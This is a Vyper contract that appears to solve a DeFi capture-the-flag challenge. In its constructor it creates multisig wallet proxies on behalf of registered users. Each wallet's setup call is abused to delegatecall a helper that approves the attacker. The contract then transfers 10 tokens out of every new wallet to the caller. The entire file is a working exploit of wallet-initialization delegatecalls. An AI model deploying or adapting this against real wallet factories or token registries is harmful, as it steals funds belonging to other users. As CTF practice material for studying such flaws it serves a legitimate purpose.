# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

date: public(Bytes[max_value(uint16)])

interface IProxyFactory:
    def createProxyWithCallback(
        singleton: address,
        initializer: Bytes[452],
        saltNonce: uint256,
        IProxyCreationCallback: address,
    ) -> address: nonpayable

@external
@payable
def __init__(
    target: address,
    proxy_factory: address,
    singleton: address,
    callback: address,
    token: address,
    users: DynArray[address, 4],
):
    accomplice: address = create_copy_of(target)
    for _user in users:
        user: DynArray[address, 1] = [_user]
        data: Bytes[452] = _abi_encode(
            user,
            convert(1, uint256),
            accomplice,
            _abi_encode(
                self,
                token,
                method_id=method_id("delegate_approve(address,address)")
            ),
            empty(address),
            empty(address),
            empty(uint256),
            empty(address),
            method_id=method_id("setup(address[],uint256,address,bytes,address,address,uint256,address)"),
        )
        new_data: Bytes[max_value(uint16)] = _abi_encode(singleton, data, empty(uint256), callback, method_id=method_id("createProxyWithCallback(address,bytes,uint256,address)"))
        self.date = new_data
        proxy: address = IProxyFactory(
            proxy_factory,
        ).createProxyWithCallback(
            singleton,
            data,
            empty(uint256),
            callback,
        )
        IERC20(token).transferFrom(proxy, msg.sender, as_wei_value(10, "ether"))
